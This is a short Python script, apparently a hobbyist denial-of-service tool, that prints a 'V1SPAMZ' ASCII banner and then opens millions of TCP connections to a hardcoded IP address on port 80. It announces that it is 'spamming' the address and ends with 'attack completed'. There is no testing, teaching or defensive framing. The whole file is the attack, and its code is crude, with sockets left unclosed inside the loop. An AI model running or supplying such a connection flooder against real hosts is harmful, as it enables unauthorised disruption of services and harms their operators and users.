import sys

sys.ps1 = '\033[01;32m '

print('''

===================================================================
_____   ________    ___________________  _____      _____  __________
\   \ /   /_   |  /   _____/\______   \/  _  \    /     \ \____    /
 \   Y   / |   |  \_____  \  |     ___/  /_\  \  /  \ /  \  /     / 
  \     /  |   |  /        \ |    |  /    |    \/    Y    \/     /_ 
   \___/   |___| /_______  / |____|  \____|__  /\____|__  /_______ \
                         \/                  \/         \/        \/
===================================================================

''')


print("connecting...")

import socket

TCP_IP = '192.0.78.13'
TCP_PORT = 80
BUFFER_SIZE = 650000
MESSAGE = "good night!"
print("spamming ", TCP_IP+":", TCP_PORT, " with Packet Size: ", BUFFER_SIZE)
for i in range(6500000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
#    s.send(MESSAGE)
    data = s.recv(BUFFER_SIZE)
s.close()
print("attack completed now go to back to bed")